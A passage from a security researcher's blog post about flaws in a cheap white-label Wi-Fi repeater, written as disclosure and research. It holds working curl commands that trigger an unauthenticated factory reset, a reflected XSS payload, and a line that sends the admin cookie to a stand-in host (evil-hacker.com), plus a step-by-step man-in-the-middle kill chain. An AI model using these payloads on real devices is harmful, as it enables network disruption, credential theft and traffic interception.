+</span></span></code></pre></div><p>Sending <code>CCMD=1&amp;FLG=1</code> triggers a full unauthenticated factory wipe — resets all 319 configuration items back to <code>admin</code>/<code>admin</code> and <code>88888888</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -v <span style="color:#e6db74">&#34;http://192.168.11.1/do_cmd.htm?CMD=SYS_CONF&amp;CCMD=1&amp;FLG=1&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># UART: Software System Reset Occurred</span>
+</span></span></code></pre></div><p>Interestingly, <code>CCMD=10</code> (note: <code>0&amp;0</code> is what the <em>official</em> frontend uses for a normal restart) triggers a softer reset — it re-parses and reloads 319 config items and restarts <code>dnsMasq</code> without a full hardware reboot:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>CFG_commit: 319 update!
+</span></span><span style="display:flex;"><span>CFG_save: write 4248 bytes to flash
+</span></span><span style="display:flex;"><span>dnsMasqstop
+</span></span><span style="display:flex;"><span>dnsMasqstart
+</span></span></code></pre></div><p>That&rsquo;s stealthy — no reboot, the network barely hiccups. Except it became unpredictable and started doing full resets anyway. Why?</p>
+<p>Because the parser in the C backend only checks if the <strong>first character of CCMD is <code>1</code></strong>. Sending <code>1</code>, <code>10</code>, <code>100</code>, <code>101</code>, or <code>1111111111111111</code> all result in a reset. The official frontend uses <code>CCMD=0</code> for a clean restart — anything starting with <code>1</code> is treated as a reset command regardless of what follows it.</p>
+<p>This also works via <code>zrlogin.cn</code> — a hardcoded captive portal domain baked into the firmware — which makes it reachable from outside the local subnet via DNS tricks:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -v <span style="color:#e6db74">&#34;http://zrlogin.cn/do_cmd.htm?CMD=SYS_CONF&amp;CCMD=1&amp;FLG=1&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># works just as well :)</span>
+</span></span></code></pre></div><h4 id="vulnerability-4-reflected-xss--cookie-theft-kill-chain">Vulnerability 4: Reflected XSS → Cookie Theft Kill Chain</h4>
+<p>The router uses a <code>GO</code> parameter to redirect users after actions. By injecting a payload, I broke out of their JavaScript string context:</p>
+<pre tabindex="0"><code>http://192.168.11.1/do_cmd.htm?CMD=SYS_CONF&amp;GO=&#39;;alert(&#39;hacked&#39;)//
+</code></pre><p>The router renders this in the page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">go</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;HACKED&#39;</span>);<span style="color:#75715e">//&#39;;
+</span></span></span></code></pre></div><p>Alert box pops perfectly. But the real attack isn&rsquo;t an alert box. Because the <code>Authorization</code> cookie has no <code>HttpOnly</code> flag (Vulnerability 2), an attacker replaces the alert with a cookie exfiltration payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#e6db74">&#39;; window.location=&#39;</span><span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//evil-hacker.com/steal?data=&#39; + document.cookie; //
+</span></span></span></code></pre></div><p>If the router admin clicks that link, the router executes the XSS, grabs the <code>Authorization</code> cookie straight from the browser&rsquo;s memory, and silently sends it to the attacker&rsquo;s server. The attacker Base64-decodes it and has the admin password. Full router compromise from a single malicious link.</p>
+<h3 id="vii---the-real-world-impact-the-ultimate-mitm-hijack">VII - The Real-World Impact: The Ultimate MitM Hijack</h3>
+<p>One important thing before we get into this: everything documented in this post — the UART bringup, the flash dump, the firmware analysis, all four vulnerabilities — happened in <strong>two days</strong>. This is not an exhaustive audit. I didn&rsquo;t map every CCMD value, didn&rsquo;t touch the GPIO pins, didn&rsquo;t dig deep into the network stack. And yet, in 48 hours of casual poking, this is what fell out. That should tell you something about the state of this firmware.</p>
+<p>You might think: <em>is this really that serious if the attacker needs to be on the local network?</em></p>
+<p>They don&rsquo;t. Because of the CSRF vulnerability and the unauthenticated <code>do_cmd.htm</code> endpoint, any attack that doesn&rsquo;t require a response from the router can be triggered via social engineering. I don&rsquo;t need the admin to click anything specific. I just need <em>anyone</em> — an employee, a student in a dorm, a customer at a cafe — to visit a webpage, click on a link, or load a page with a hidden image tag while connected to the Wi-Fi. The browser fires the request, the router blindly accepts it, network drops.</p>
+<p>If I <em>am</em> nearby, the kill chain is worse:</p>
+<ol>
+<li>Send the unauthenticated factory reset (<code>CCMD=1&amp;FLG=1</code>) to wipe the owner&rsquo;s settings and restore the default <code>admin</code> password.</li>
+<li>Log into the web panel using the restored defaults.</li>
+<li>Reconfigure the repeater to use <em>my</em> cellular hotspot as its upstream connection instead of the victim&rsquo;s actual router.</li>
+</ol>
+<p>Anyone who connects to this repeater thinking they&rsquo;re safe at home or in a café is now routing 100% of their traffic through me. DNS redirects to fake captive portals, packet sniffing, credential harvesting — all of it. A $5 piece of plastic becomes a weaponized Man-in-the-Middle rogue access point in under 30 seconds.</p>
+<h3 id="viii---the-white-label-epidemic--final-thoughts">VIII - The White-Label Epidemic &amp; Final Thoughts</h3>
+<p>Here is the scariest part: you might own this exact firmware and not even know it. These are generic, white-labeled repeaters. Dozens of obscure &ldquo;brands&rdquo; slap their logo on this exact board, flash this exact software, and sell it.</p>
+<p>The copyright inside this firmware says <strong>2006</strong>. The U-Boot was compiled <strong>December 13, 2017</strong>. And yet I am still seeing these brand new in boxes being sold in shops and on Facebook Marketplace all across Morocco in 2026.</p>
+<p>The MAC address placeholder <code>00:AA:BB:CC:DD:10</code> and credential placeholders <code>AAAAAA</code>, <code>BBBBBB</code> that shipped to production tell you everything you need to know about the care that went into this. Nobody audited anything. They copied firmware from a reference design, slapped a logo on it, and shipped it.</p>
+<p>The lesson is simple: don&rsquo;t just buy the cheap thing because it &ldquo;does the job.&rdquo; It does the job, but it does it so poorly and insecurely that you are paying for it with your entire network&rsquo;s safety.</p>
+<h3 id="ix---whats-next">IX - What&rsquo;s Next</h3>
+<p>Of course this isn&rsquo;t the end. Two days in and we already have four unauth vulnerabilities, plaintext credentials in flash, a disabled firewall, and a broken parser — and I&rsquo;ve barely scratched the surface. I didn&rsquo;t map all the CCMD values, didn&rsquo;t look at the GPIO pins, didn&rsquo;t touch the network stack beyond what the web UI exposed. There&rsquo;s a lot more to find.</p>
+<p>Next up: mapping the GPIOs, and maybe porting a minimal Linux image to it or writing a bare-metal piece of code that runs directly on the MIPS core — just to see if it&rsquo;s doable. And if the board survives all of that, the plan is to repurpose it into something actually useful: either a wireless debugger for my other projects, or a cheap UART-to-WiFi bridge that gives my other boards network connectivity over serial. The possibilities are honestly endless for $5.</p>
+<p>More to come.</p>
+</section></main>
+        <footer id="main-footer"><div class="footer">
+  <a href="#">Scroll to Top</a>
+  <div class="footer-copyright">
+    <div class="dim">© 2026 Taha Ed-dafili</div>
+    <div>Made with ❤️ and powered by <a href="https://github.com/math-queiroz/rusty-typewriter" target="_blank">Rusty Typewriter</a> theme for <a href="https://gohugo.io/" target="_blank">Hugo</a></div>
+  </div>
+</div>
+</footer>
+      </div><aside id="side-pane" class="side-sticky"><div class="side-details">
+    <span>2736 words</span>
+    <span>16 - 20 minutes read</span></div><h3>Table Of Contents</h3><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#i---beyond-the-basics-the-hardware-profile">I - Beyond the Basics: The Hardware Profile</a></li>
+        <li><a href="#ii---hunting-the-uart-multimeters-and-datasheets">II - Hunting the UART: Multimeters and Datasheets</a></li>
+        <li><a href="#iii---the-58-minute-flash-dump-trial-error-and-jackpots">III - The 58-Minute Flash Dump (Trial, Error, and Jackpots)</a></li>
+        <li><a href="#iv---the-linux-lie--binwalk-dissection">IV - The &ldquo;Linux&rdquo; Lie &amp; Binwalk Dissection</a></li>
+        <li><a href="#v---the-live-ecos-shell--nvram-plaintext">V - The Live eCos Shell &amp; NVRAM Plaintext</a></li>
+        <li><a href="#vi---decimating-the-web-layer">VI - Decimating the Web Layer</a></li>
+        <li><a href="#vii---the-real-world-impact-the-ultimate-mitm-hijack">VII - The Real-World Impact: The Ultimate MitM Hijack</a></li>
+        <li><a href="#viii---the-white-label-epidemic--final-thoughts">VIII - The White-Label Epidemic &amp; Final Thoughts</a></li>
+        <li><a href="#ix---whats-next">IX - What&rsquo;s Next</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></aside></div>
+  </div>
+</body>
+</html>
